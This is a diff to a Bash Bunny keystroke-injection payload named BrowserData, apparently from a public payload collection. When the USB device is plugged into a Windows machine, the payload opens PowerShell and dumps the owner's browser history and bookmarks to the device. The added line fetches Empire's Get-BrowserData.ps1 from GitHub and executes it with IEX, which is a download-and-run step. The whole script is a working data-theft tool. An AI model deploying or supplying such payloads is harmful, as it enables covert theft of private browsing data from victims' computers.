@@ -1,10 +1,11 @@
+exit
 #!/bin/bash
 #
 # Title:         BrowserData
 # Author:        zachstanford
-# Version:       0.1
+# Version:       0.1 (Tested on Windows 10)
 #
-# Dumps browser info like history and bookmarks from local ps1 file 
+# Dumps browser info like history and bookmarks from  powershell script 
 # then saves them in /root/udisk/loot/BrowserData/%ComputerName%
 # Credits to this Empire's powershell script:
 # https://github.com/EmpireProject/Empire/blob/master/data/module_source/collection/Get-BrowserData.ps1
@@ -13,6 +14,8 @@
 # Blue...............Running Script
 # Purple.............Finished
 
+# Source bunny_helpers.sh to get environment variable SWITCH_POSITION
+source bunny_helpers.sh
 
 LED R 200
 LOOTDIR=/root/udisk/loot/BrowserData
@@ -25,13 +28,7 @@ LED B 200
 Q DELAY 6000
 Q GUI r
 Q DELAY 100
-Q STRING POWERSHELL
-Q ENTER
-Q DELAY 500
-Q STRING $Bunny = (gwmi win32_volume -f 'label=''BashBunny''' |  Select-Object -ExpandProperty DriveLetter)
-Q ENTER
-Q DELAY 100
-Q STRING (gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\$SWITCH_POSITION\Get-BrowserData.ps1'; Get-BrowserInformation | Out-File $Bunny\loot\BrowserData\$env:computername.txt;
+Q STRING powershell "$bunny =(gwmi win32_volume -f 'label=''BashBunny''' |  Select-Object -ExpandProperty DriveLetter); IEX (New-Object Net.WebClient).downloadstring("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/collection/Get-BrowserData.ps1"); Get-BrowserInformation | Out-File -Append $bunny\loot\BrowserData\$env:computername.txt;"
 Q ENTER
 Q DELAY 2000
 Q STRING exit
